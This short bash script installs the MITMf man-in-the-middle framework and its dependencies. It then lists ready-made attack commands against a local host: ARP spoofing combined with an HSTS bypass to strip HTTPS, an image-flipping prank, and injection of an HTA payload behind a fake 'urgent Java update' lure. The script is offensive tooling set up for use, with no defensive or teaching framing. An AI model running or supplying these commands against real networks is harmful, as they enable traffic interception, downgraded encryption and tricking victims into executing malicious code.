#!/usr/bin/env bash

#ML 2020

cd ~
apt install -y python-dev python-setuptools libpcap0.8-dev libnetfilter-queue-dev libssl-dev libjpeg-dev libxml2-dev libcapstone3 libcapstone-dev libffi-dev file python-pip
pip install virtualenvwrapper
source /usr/local/bin/virtualenvwrapper.sh
mkvirtualenv MITMf -p /usr/bin/python2.7
git clone https://github.com/byt3bl33d3r/MITMf
cd MITMf && git submodule init && git submodule update --recursive
pip install -r requirements.txt 
ls
echo mitmf.py -i eth0 --spoof --arp --target 192.168.0.172 --gateway 192.168.0.1 --upsidedownternet
echo python mitmf.py -i eth0 --spoof --arp --target 192.168.0.172 --gateway 192.168.0.1 --hsts
echo python mitmf.py -i eth0 --spoof --arp --target 192.168.0.172 --gateway 192.168.0.1 --hta --text "your java installation requires an urgent update"

